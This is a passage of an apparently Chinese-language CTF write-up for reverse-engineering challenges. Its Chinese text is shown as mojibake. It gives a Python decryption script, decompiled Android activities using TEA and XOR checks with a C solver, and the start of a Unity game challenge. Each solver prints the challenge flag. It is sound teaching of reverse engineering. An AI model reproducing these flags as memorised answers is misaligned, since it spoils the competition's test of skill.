<span class="number">0xA8</span></span><br><span class="line">v17[<span class="number">21</span>] = <span class="number">0xEB</span></span><br><span class="line">v17[<span class="number">22</span>] = <span class="number">0xEC</span></span><br><span class="line">v17[<span class="number">23</span>] = <span class="number">0x4A</span></span><br><span class="line">v17[<span class="number">24</span>] = <span class="number">0x6F</span></span><br><span class="line">v17[<span class="number">25</span>] = <span class="number">0xE8</span></span><br><span class="line">v17[<span class="number">26</span>] = <span class="number">0x35</span></span><br><span class="line">v17[<span class="number">27</span>] = <span class="number">0xF9</span></span><br><span class="line">v17[<span class="number">28</span>] = <span class="number">0xAC</span></span><br><span class="line">v17[<span class="number">29</span>] = <span class="number">0xA7</span></span><br><span class="line">v17[<span class="number">30</span>] = <span class="number">0x8C</span></span><br><span class="line">v17[<span class="number">31</span>] = <span class="number">0x71</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift_row</span>(<span class="params">flag:<span class="built_in">list</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            flag[<span class="number">4</span> * i + <span class="number">3</span> - k], flag[<span class="number">4</span> * i + <span class="number">3</span> - k - <span class="number">1</span>] = flag[<span class="number">4</span> * i + <span class="number">3</span> - k - <span class="number">1</span>], flag[<span class="number">4</span> * i + <span class="number">3</span> - k]</span><br><span class="line">  <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key1 = []</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> key_:</span><br><span class="line">  key1.append(<span class="built_in">ord</span>(each) &amp; <span class="number">0xFF</span>)</span><br><span class="line">key2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">  key2.append(key1[i] ^ S[key1[i]] &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line">flag_after = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">  temp = v17[i] ^ key2[i % <span class="number">0x10</span>]</span><br><span class="line">  flag_after.append(temp)</span><br><span class="line"></span><br><span class="line">flag  = shift_row(flag_after[<span class="number">0</span> :<span class="number">16</span>])</span><br><span class="line">flag += shift_row(flag_after[<span class="number">16</span>:<span class="number">32</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">  flag[i] = S.index(flag[i])</span><br><span class="line">  flag[i] ^= key1[i % <span class="number">0x10</span>]</span><br><span class="line"></span><br><span class="line">flag1 = [<span class="literal">None</span>] * <span class="number">16</span></span><br><span class="line">flag2 = [<span class="literal">None</span>] * <span class="number">16</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    flag1[<span class="number">4</span> * j + i] = S.index(flag[cnt])</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    flag2[<span class="number">4</span> * j + i] = S.index(flag[cnt])</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">flag_last  = shift_row(flag1)</span><br><span class="line">flag_last += shift_row(flag2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> flag_last:</span><br><span class="line">  t = S.index(each)</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(t), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># SYC&#123;0.o_Thls_1s_n0t_A3s_(q^_^p)&#125;</span></span><br></pre></td></tr></table></figure>

<p>å¦å¤– ä¸è¦æ‰‹æŠ„keyä¸è¦æ‰‹æŠ„keyä¸è¦æ‰‹æŠ„keyä¸è¦æ‰‹æŠ„keyä¸è¦æ‰‹æŠ„keyä¸è¦æ‰‹æŠ„keyä¸è¦æ‰‹æŠ„keyä¸è¦æ‰‹æŠ„keyä¸è¦æ‰‹æŠ„keyä¸è¦æ‰‹æŠ„key</p>
<h3 id="ezandroid-å®‰å“é€†å‘"><a href="#ezandroid-å®‰å“é€†å‘" class="headerlink" title="ezandroid | å®‰å“é€†å‘"></a>ezandroid | å®‰å“é€†å‘</h3><p>apkç”¨jebæ‰“å¼€ æœ‰ä¸¤ä¸ªä¸»è¦æ´»åŠ¨å¦‚ä¸‹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.babyapk_1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.Handler;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> b.f;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">f</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">b</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span>[] a;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">b</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.a = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">2023708229</span>, -<span class="number">158607964</span>, <span class="number">0x81963FFA</span>, <span class="number">0x458FAC58</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> EditText o;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// b.f</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle0)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Handler</span>();</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle0);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F0B001C</span>);  <span class="comment">// layout:activity_main</span></span><br><span class="line">        <span class="type">Button</span> <span class="variable">button0</span> <span class="operator">=</span> (Button)<span class="built_in">this</span>.findViewById(<span class="number">0x7F080057</span>);  <span class="comment">// id:button</span></span><br><span class="line">        <span class="built_in">this</span>.o = (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F080097</span>);  <span class="comment">// id:edit_text</span></span><br><span class="line">        button0.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span>  <span class="comment">// android.view.View$OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view0)</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.o.getText().toString();</span><br><span class="line">                <span class="keyword">if</span>(s.length() &gt; <span class="number">24</span>) &#123;</span><br><span class="line">                    MainActivity.<span class="built_in">this</span>.o.setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">                    s = MainActivity.<span class="built_in">this</span>.o.getText().toString();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(((s.length() == <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>) | (s.length() % <span class="number">24</span> == <span class="number">0</span> ? <span class="number">0</span> : <span class="number">1</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">v</span> <span class="operator">=</span> <span class="number">24</span> - s.length() % <span class="number">24</span>;</span><br><span class="line">                    <span class="type">StringBuilder</span> <span class="variable">stringBuilder0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(s);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="number">0</span>; v1 &lt; v; ++v1) &#123;</span><br><span class="line">                        stringBuilder0.append(<span class="string">&#x27;X&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    s = stringBuilder0.toString();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">stringBuilder1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">stringBuilder2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">v2</span> <span class="operator">=</span> <span class="number">0</span>; v2 &lt; s.length(); ++v2) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(v2 % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                        stringBuilder1.append(s.charAt(v2));</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        stringBuilder2.append(s.charAt(v2));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">b</span> <span class="variable">mainActivity$b0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">b</span>(MainActivity.<span class="built_in">this</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> stringBuilder2.toString();</span><br><span class="line">                <span class="type">byte</span>[] arr_b = stringBuilder1.toString().getBytes();</span><br><span class="line">                <span class="type">int</span> <span class="variable">v3</span> <span class="operator">=</span> arr_b.length &gt;&gt; <span class="number">2</span>;</span><br><span class="line">                <span class="type">int</span>[] arr_v = <span class="keyword">new</span> <span class="title class_">int</span>[v3];</span><br><span class="line">                <span class="type">int</span> <span class="variable">v5</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">v4</span> <span class="operator">=</span> <span class="number">0</span>; v4 &lt; arr_b.length; v4 += <span class="number">4</span>) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">v6</span> <span class="operator">=</span> arr_b[v4 + <span class="number">3</span>];</span><br><span class="line">                    <span class="keyword">if</span>(v6 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                        v6 += <span class="number">0x100</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">int</span> <span class="variable">v7</span> <span class="operator">=</span> arr_b[v4 + <span class="number">2</span>];</span><br><span class="line">                    <span class="keyword">if</span>(v7 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                        v7 += <span class="number">0x100</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">int</span> <span class="variable">v8</span> <span class="operator">=</span> arr_b[v4 + <span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">if</span>(v8 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                        v8 += <span class="number">0x100</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    arr_v[v5] = v6 | v7 &lt;&lt; <span class="number">8</span> | v8 &lt;&lt; <span class="number">16</span> | arr_b[v4] &lt;&lt; <span class="number">24</span>;</span><br><span class="line">                    ++v5;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">int</span> <span class="variable">v9</span> <span class="operator">=</span> arr_v[<span class="number">0</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">v10</span> <span class="operator">=</span> arr_v[<span class="number">1</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">v11</span> <span class="operator">=</span> arr_v[<span class="number">2</span>];</span><br><span class="line">                <span class="type">int</span>[] arr_v1 = mainActivity$b0.a;</span><br><span class="line">                <span class="type">int</span> <span class="variable">key_0</span> <span class="operator">=</span> arr_v1[<span class="number">0</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">key_1</span> <span class="operator">=</span> arr_v1[<span class="number">1</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">key_2</span> <span class="operator">=</span> arr_v1[<span class="number">2</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">key_3</span> <span class="operator">=</span> arr_v1[<span class="number">3</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">v16</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">v17</span> <span class="operator">=</span> <span class="number">0</span>; v17 &lt; <span class="number">0x20</span>; ++v17) &#123;</span><br><span class="line">                    v16 += -<span class="number">1640531527</span>;</span><br><span class="line">                    v9 += (v10 &lt;&lt; <span class="number">4</span>) + key_0 ^ v10 + v16 ^ (v10 &gt;&gt; <span class="number">5</span>) + key_1;</span><br><span class="line">                    v10 += (v9 &lt;&lt; <span class="number">4</span>) + key_2 ^ v9 + v16 ^ (v9 &gt;&gt; <span class="number">5</span>) + key_3;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                arr_v[<span class="number">0</span>] = v9;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">v18</span> <span class="operator">=</span> <span class="number">0</span>; v18 &lt; <span class="number">0x20</span>; ++v18) &#123;</span><br><span class="line">                    v16 += -<span class="number">1640531527</span>;</span><br><span class="line">                    v11 += (v10 &lt;&lt; <span class="number">4</span>) + key_0 ^ v10 + v16 ^ (v10 &gt;&gt; <span class="number">5</span>) + key_1;</span><br><span class="line">                    v10 += (v11 &lt;&lt; <span class="number">4</span>) + key_2 ^ v11 + v16 ^ (v11 &gt;&gt; <span class="number">5</span>) + key_3;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                arr_v[<span class="number">1</span>] = v11;</span><br><span class="line">                arr_v[<span class="number">2</span>] = v10;</span><br><span class="line">                <span class="type">byte</span>[] arr_b1 = <span class="keyword">new</span> <span class="title class_">byte</span>[v3 &lt;&lt; <span class="number">2</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">v20</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">v19</span> <span class="operator">=</span> <span class="number">0</span>; v19 &lt; v3; ++v19) &#123;</span><br><span class="line">                    arr_b1[v20 + <span class="number">3</span>] = (<span class="type">byte</span>)(arr_v[v19] &amp; <span class="number">0xFF</span>);</span><br><span class="line">                    arr_b1[v20 + <span class="number">2</span>] = (<span class="type">byte</span>)(arr_v[v19] &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">                    arr_b1[v20 + <span class="number">1</span>] = (<span class="type">byte</span>)(arr_v[v19] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">                    arr_b1[v20] = (<span class="type">byte</span>)(arr_v[v19] &gt;&gt; <span class="number">24</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">                    v20 += <span class="number">4</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">v21</span> <span class="operator">=</span> <span class="number">0</span>; v21 &lt; <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;-<span class="number">91</span>, -<span class="number">8</span>, -<span class="number">110</span>, -<span class="number">55</span>, -<span class="number">49</span>, <span class="number">75</span>, <span class="number">0x73</span>, <span class="number">13</span>, -<span class="number">76</span>, (<span class="type">byte</span>)<span class="number">0x8F</span>, <span class="number">102</span>, <span class="number">80</span>&#125;.length; ++v21) &#123;</span><br><span class="line">                    System.out.println(((<span class="type">int</span>)arr_b1[v21]));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">int</span> <span class="variable">v23</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">v22</span> <span class="operator">=</span> <span class="number">0</span>; <span class="literal">true</span>; ++v22) &#123;</span><br><span class="line">                    <span class="type">byte</span>[] arr_b2 = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;-<span class="number">91</span>, -<span class="number">8</span>, -<span class="number">110</span>, -<span class="number">55</span>, -<span class="number">49</span>, <span class="number">75</span>, <span class="number">0x73</span>, <span class="number">13</span>, -<span class="number">76</span>, (<span class="type">byte</span>)<span class="number">0x8F</span>, <span class="number">102</span>, <span class="number">80</span>&#125;;</span><br><span class="line">                    <span class="keyword">if</span>(v22 &gt;= arr_b2.length) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(arr_b1[v22] != arr_b2[v22]) &#123;</span><br><span class="line">                        Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="string">&quot;You\&#x27;re Wrong!\n&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                        v23 = <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">Intent</span> <span class="variable">intent0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(MainActivity.<span class="built_in">this</span>, MainActivity2.class);</span><br><span class="line">                intent0.putExtra(<span class="string">&quot;ad@#E!@a123&quot;</span>, s1);</span><br><span class="line">                intent0.putExtra(<span class="string">&quot;eCAS213@!@3&quot;</span>, arr_b1);</span><br><span class="line">                <span class="keyword">if</span>(v23 == <span class="number">1</span>) &#123;</span><br><span class="line">                    MainActivity.<span class="built_in">this</span>.startActivity(intent0);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">package</span> com.example.babyapk_1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> b.f;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity2</span> <span class="keyword">extends</span> <span class="title class_">f</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// b.f</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle0)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle0);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F0B001D</span>);  <span class="comment">// layout:activity_main2</span></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent0</span> <span class="operator">=</span> <span class="built_in">this</span>.getIntent();</span><br><span class="line">        <span class="type">byte</span>[] arr_b = intent0.getStringExtra(<span class="string">&quot;ad@#E!@a123&quot;</span>).getBytes();</span><br><span class="line">        <span class="type">byte</span>[] arr_b1 = intent0.getByteArrayExtra(<span class="string">&quot;eCAS213@!@3&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">v</span> <span class="operator">=</span> <span class="number">0</span>; v &lt; arr_b1.length; ++v) &#123;</span><br><span class="line">            arr_b1[v] = (<span class="type">byte</span>)(arr_b1[v] ^ arr_b[v % arr_b.length]);</span><br><span class="line">            <span class="keyword">if</span>(arr_b1[v] != <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">107</span>, -<span class="number">106</span>, <span class="number">0xFFFFFFA1</span>, <span class="number">0xFFFFFF8D</span>, <span class="number">0xFFFFFF89</span>, <span class="number">0x7F</span>, <span class="number">26</span>, <span class="number">0x79</span>, -<span class="number">62</span>, -<span class="number">20</span>, <span class="number">86</span>, <span class="number">9</span>&#125;[v]) &#123;</span><br><span class="line">                Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;N0T Right,Maybe try more harder?\n&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                v1 = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(v1 == <span class="number">1</span>) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Congratulations!&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å½“MainActivity1ä¸­çš„åŒ¹é…é€šè¿‡åæ‰ä¼šè¿›è¡ŒMainActivity2çš„å¦ä¸€éƒ¨åˆ†åŠ å¯† ä¸»è¦æ˜¯åˆ†å¥‡å¶ç´¢å¼•è¿›è¡ŒTEAæˆ–å¼‚æˆ–åŠ å¯† æ®æ­¤å†™å‡ºè§£å¯†è„šæœ¬</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> arr_even[<span class="number">12</span>] = &#123;<span class="number">-107</span>, <span class="number">-106</span>, <span class="number">0xFFFFFFA1</span>, <span class="number">0xFFFFFF8D</span>, <span class="number">0xFFFFFF89</span>, <span class="number">0x7F</span>, <span class="number">26</span>, <span class="number">0x79</span>, <span class="number">-62</span>, <span class="number">-20</span>, <span class="number">86</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key_even[<span class="number">12</span>] = &#123;<span class="number">-91</span>, <span class="number">-8</span>, <span class="number">-110</span>, <span class="number">-55</span>, <span class="number">-49</span>, <span class="number">75</span>, <span class="number">0x73</span>, <span class="number">13</span>, <span class="number">-76</span>, <span class="number">0x8F</span>, <span class="number">102</span>, <span class="number">80</span>&#125;;</span><br><span class="line">    <span class="type">char</span> flag_even[<span class="number">12</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)&#123;</span><br><span class="line">        flag_even[i] = arr_even[i] ^ key_even[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> flag_odd_[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i += <span class="number">4</span>)&#123;</span><br><span class="line">        flag_odd_[(<span class="type">int</span>)(i / <span class="number">4</span>)] = key_even[i + <span class="number">3</span>] | key_even[i + <span class="number">2</span>] &lt;&lt; <span class="number">8</span> | key_even[i + <span class="number">1</span>] &lt;&lt; <span class="number">16</span> | key_even[i] &lt;&lt; <span class="number">24</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> TEA_key[<span class="number">4</span>] = &#123;<span class="number">2023708229</span>, <span class="number">-158607964</span>, <span class="number">0x81963FFA</span>, <span class="number">0x458FAC58</span>&#125;;</span><br><span class="line">    <span class="type">int</span> delta = <span class="number">-1640531527</span> * <span class="number">0x40</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; i++)&#123;</span><br><span class="line">        flag_odd_[<span class="number">2</span>] -= (flag_odd_[<span class="number">1</span>] &lt;&lt; <span class="number">4</span>) + TEA_key[<span class="number">2</span>] ^ flag_odd_[<span class="number">1</span>] + delta ^ (flag_odd_[<span class="number">1</span>] &gt;&gt; <span class="number">5</span>) + TEA_key[<span class="number">3</span>];</span><br><span class="line">        flag_odd_[<span class="number">1</span>] -= (flag_odd_[<span class="number">2</span>] &lt;&lt; <span class="number">4</span>) + TEA_key[<span class="number">0</span>] ^ flag_odd_[<span class="number">2</span>] + delta ^ (flag_odd_[<span class="number">2</span>] &gt;&gt; <span class="number">5</span>) + TEA_key[<span class="number">1</span>];</span><br><span class="line">        delta += <span class="number">1640531527</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; i++)&#123;</span><br><span class="line">        flag_odd_[<span class="number">2</span>] -= (flag_odd_[<span class="number">0</span>] &lt;&lt; <span class="number">4</span>) + TEA_key[<span class="number">2</span>] ^ flag_odd_[<span class="number">0</span>] + delta ^ (flag_odd_[<span class="number">0</span>] &gt;&gt; <span class="number">5</span>) + TEA_key[<span class="number">3</span>];</span><br><span class="line">        flag_odd_[<span class="number">0</span>] -= (flag_odd_[<span class="number">2</span>] &lt;&lt; <span class="number">4</span>) + TEA_key[<span class="number">0</span>] ^ flag_odd_[<span class="number">2</span>] + delta ^ (flag_odd_[<span class="number">2</span>] &gt;&gt; <span class="number">5</span>) + TEA_key[<span class="number">1</span>];</span><br><span class="line">        delta += <span class="number">1640531527</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flag_odd[<span class="number">12</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        flag_odd[<span class="number">3</span> - i] = (flag_odd_[<span class="number">0</span>] &gt;&gt; i * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        flag_odd[<span class="number">7</span> - i] = (flag_odd_[<span class="number">2</span>] &gt;&gt; i * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        flag_odd[<span class="number">11</span> - i] = (flag_odd_[<span class="number">1</span>] &gt;&gt; i * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;SYC&#123;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,  flag_odd[(<span class="type">int</span>)(i / <span class="number">2</span>)]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, flag_even[(<span class="type">int</span>)(i / <span class="number">2</span>)]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">    <span class="comment">// SYC&#123;T00nV3tD3F34Tint0vict0rY&#125;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æ˜¯ç”·äººå°±æ¥æ‰é’ˆ-Unityå¼•æ“æ¸¸æˆé€†å‘"><a href="#æ˜¯ç”·äººå°±æ¥æ‰é’ˆ-Unityå¼•æ“æ¸¸æˆé€†å‘" class="headerlink" title="æ˜¯ç”·äººå°±æ¥æ‰é’ˆ | Unityå¼•æ“æ¸¸æˆé€†å‘"></a>æ˜¯ç”·äººå°±æ¥æ‰é’ˆ | Unityå¼•æ“æ¸¸æˆé€†å‘</h3><p>Unityå¼•æ“æ¸¸æˆçš„æ§åˆ¶é€»è¾‘ä¸€èˆ¬å­˜æ”¾åœ¨<code>.\*_Data\Managed\Assembly-CSharp.dll</code>ä¸­ ç”¨dnspyæ‰“å¼€ ä¸»è¦é€»è¾‘å¦‚ä¸‹</p>
